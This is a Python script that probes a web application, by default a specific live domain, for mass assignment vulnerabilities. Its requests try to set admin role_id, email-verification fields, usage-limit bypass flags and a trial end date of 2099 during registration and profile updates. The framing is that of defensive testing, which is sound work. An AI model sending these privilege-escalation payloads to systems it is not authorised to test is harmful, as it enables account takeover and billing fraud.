#!/usr/bin/env python3
"""
Test Mass Assignment Vulnerabilities
Tests if sensitive fields can be manipulated during registration/updates
"""

import requests
import time
import json
import sys
import os
from datetime import datetime
from colorama import Fore, Style, init

# Add parent directory to path for session_helper import
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from session_helper import SessionManager

init(autoreset=True)

class MassAssignmentTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.results = []
        self.session_manager = SessionManager(base_url)

    def log_result(self, test_name, success, details):
        """Log test result"""
        result = {
            'test': test_name,
            'success': success,
            'details': details,
            'timestamp': datetime.now().isoformat()
        }
        self.results.append(result)

        status = f"{Fore.RED}VULNERABLE" if success else f"{Fore.GREEN}SECURE"
        print(f"[{status}{Style.RESET_ALL}] {test_name}")
        print(f"  └─ {details}\n")

    def test_admin_escalation_registration(self):
        """Test if role_id can be set during registration"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 1: Admin Privilege Escalation via Registration")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        timestamp = int(time.time())
        payload = {
            "name": "Mass Assignment Test",
            "email": f"mass-assign-{timestamp}@example.com",
            "password": "Password123",
            "password_confirmation": "Password123",
            "role_id": 1,  # Try to set admin role
            "verified": 1,
            "email_verified_at": "2025-10-29 00:00:00"
        }

        try:
            response = requests.post(
                f"{self.base_url}/register",
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )

            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:500]}\n")

            # Check if registration succeeded
            if response.status_code in [200, 201, 302]:
                self.log_result(
                    "Admin Escalation (Registration)",
                    True,
                    f"Registration succeeded with role_id=1! Account: {payload['email']}"
                )
                return True
            else:
                self.log_result(
                    "Admin Escalation (Registration)",
                    False,
                    "Registration rejected or failed"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("Admin Escalation (Registration)", False, f"Error: {str(e)}")
            return False

    def test_bypass_flags_registration(self):
        """Test if bypass flags can be set during registration"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 2: Bypass Flags via Registration")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        timestamp = int(time.time())
        payload = {
            "name": "Bypass Test",
            "email": f"bypass-test-{timestamp}@example.com",
            "password": "Password123",
            "password_confirmation": "Password123",
            "bypass_campaign_sync_limit": True,
            "bypass_post_sync_limit": True,
            "bypass_ai_reply_limit": True
        }

        try:
            response = requests.post(
                f"{self.base_url}/register",
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )

            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:500]}\n")

            if response.status_code in [200, 201, 302]:
                self.log_result(
                    "Bypass Flags (Registration)",
                    True,
                    f"Bypass flags accepted! Account: {payload['email']}"
                )
                return True
            else:
                self.log_result(
                    "Bypass Flags (Registration)",
                    False,
                    "Bypass flags rejected"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("Bypass Flags (Registration)", False, f"Error: {str(e)}")
            return False

    def test_trial_manipulation(self):
        """Test if trial dates can be manipulated"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 3: Trial Manipulation via Registration")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        timestamp = int(time.time())
        payload = {
            "name": "Trial Test",
            "email": f"trial-test-{timestamp}@example.com",
            "password": "Password123",
            "password_confirmation": "Password123",
            "trial_ends_at": "2099-12-31 23:59:59",
            "trial_activated_at": None
        }

        try:
            response = requests.post(
                f"{self.base_url}/register",
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )

            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:500]}\n")

            if response.status_code in [200, 201, 302]:
                self.log_result(
                    "Trial Manipulation (Registration)",
                    True,
                    f"Trial date accepted (2099)! Account: {payload['email']}"
                )
                return True
            else:
                self.log_result(
                    "Trial Manipulation (Registration)",
                    False,
                    "Trial date manipulation rejected"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("Trial Manipulation (Registration)", False, f"Error: {str(e)}")
            return False

    def test_email_verification_bypass(self):
        """Test if email verification can be bypassed"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 4: Email Verification Bypass")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        timestamp = int(time.time())

        # Test with 'verified' field
        payload1 = {
            "name": "Verify Bypass 1",
            "email": f"verify-bypass1-{timestamp}@example.com",
            "password": "Password123",
            "password_confirmation": "Password123",
            "verified": 1
        }

        # Test with 'email_verified_at' field
        payload2 = {
            "name": "Verify Bypass 2",
            "email": f"verify-bypass2-{timestamp}@example.com",
            "password": "Password123",
            "password_confirmation": "Password123",
            "email_verified_at": "2025-10-29 00:00:00"
        }

        vulnerable = False

        for i, payload in enumerate([payload1, payload2], 1):
            try:
                print(f"Method {i}: {list(payload.keys())[-1]}")
                response = requests.post(
                    f"{self.base_url}/register",
                    json=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )

                print(f"Status Code: {response.status_code}")
                print(f"Response: {response.text[:300]}\n")

                if response.status_code in [200, 201, 302]:
                    vulnerable = True

            except Exception as e:
                print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")

        if vulnerable:
            self.log_result(
                "Email Verification Bypass",
                True,
                "Email verification can be bypassed during registration!"
            )
        else:
            self.log_result(
                "Email Verification Bypass",
                False,
                "Email verification bypass prevented"
            )

        return vulnerable

    def test_profile_update_escalation(self, email, password):
        """Test privilege escalation via profile update"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 5: Privilege Escalation via Profile Update")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        # Authenticate (login or use existing session)
        try:
            print("Authenticating...")
            success, auth_data, message = self.session_manager.login_if_needed(email, password)

            if not success:
                print(f"{Fore.RED}Authentication failed: {message}{Style.RESET_ALL}")
                self.log_result(
                    "Profile Update Escalation",
                    False,
                    f"Could not authenticate: {message}"
                )
                return False

            print(f"{Fore.GREEN}{message}{Style.RESET_ALL}")

            # Extract token
            if isinstance(auth_data, str):
                token = auth_data
                print(f"Token: {token[:20]}...\n")
            else:
                # Using cookies, need to extract token differently
                token = self.session_manager.api_token
                if not token:
                    print(f"{Fore.YELLOW}Using cookie-based auth{Style.RESET_ALL}\n")
                    token = None

            # Try to update profile with escalated privileges
            update_payload = {
                "role_id": 1,
                "bypass_ai_reply_limit": True,
                "bypass_campaign_sync_limit": True,
                "trial_ends_at": "2099-12-31"
            }

            # Make authenticated request
            if token:
                # Token-based auth
                update_response = requests.put(
                    f"{self.base_url}/api/user/profile",
                    json=update_payload,
                    headers={
                        'Authorization': f'Bearer {token}',
                        'Content-Type': 'application/json'
                    },
                    timeout=10
                )
            else:
                # Cookie-based auth (existing session)
                update_response = self.session_manager.make_authenticated_request(
                    'put',
                    f"{self.base_url}/api/user/profile",
                    json=update_payload,
                    headers={'Content-Type': 'application/json'}
                )

            print(f"Update Status Code: {update_response.status_code}")
            print(f"Update Response: {update_response.text[:500]}\n")

            if update_response.status_code in [200, 201]:
                self.log_result(
                    "Profile Update Escalation",
                    True,
                    "Profile updated with escalated privileges!"
                )
                return True
            else:
                self.log_result(
                    "Profile Update Escalation",
                    False,
                    "Profile update rejected"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("Profile Update Escalation", False, f"Error: {str(e)}")
            return False

    def run_all_tests(self, test_email=None, test_password=None):
        """Run all mass assignment tests"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"MASS ASSIGNMENT VULNERABILITY TESTS")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        print(f"Target: {self.base_url}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        # Run tests
        self.test_admin_escalation_registration()
        time.sleep(1)

        self.test_bypass_flags_registration()
        time.sleep(1)

        self.test_trial_manipulation()
        time.sleep(1)

        self.test_email_verification_bypass()
        time.sleep(1)

        if test_email and test_password:
            self.test_profile_update_escalation(test_email, test_password)
        else:
            print(f"{Fore.YELLOW}Skipping profile update test (no credentials provided){Style.RESET_ALL}\n")

        # Summary
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"TEST SUMMARY")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        vulnerable_count = sum(1 for r in self.results if r['success'])
        total_count = len(self.results)

        print(f"Total Tests: {total_count}")
        print(f"Vulnerable: {Fore.RED}{vulnerable_count}{Style.RESET_ALL}")
        print(f"Secure: {Fore.GREEN}{total_count - vulnerable_count}{Style.RESET_ALL}\n")

        if vulnerable_count > 0:
            print(f"{Fore.RED}⚠️  CRITICAL: Mass assignment vulnerabilities detected!{Style.RESET_ALL}")
            print(f"{Fore.RED}   Attackers can escalate privileges and bypass security controls.{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.GREEN}✓ All mass assignment tests passed{Style.RESET_ALL}\n")

        return self.results

if __name__ == "__main__":
    import sys
    import os
    from dotenv import load_dotenv

    # Load environment variables
    load_dotenv()

    base_url = os.getenv('BASE_URL', 'https://evenleads.com')
    test_email = os.getenv('TEST_EMAIL')
    test_password = os.getenv('TEST_PASSWORD')

    if len(sys.argv) > 1:
        base_url = sys.argv[1]

    tester = MassAssignmentTester(base_url)
    results = tester.run_all_tests(test_email, test_password)

    # Save results
    with open('results_mass_assignment.json', 'w') as f:
        json.dump(results, f, indent=2)
    print(f"Results saved to: results_mass_assignment.json")
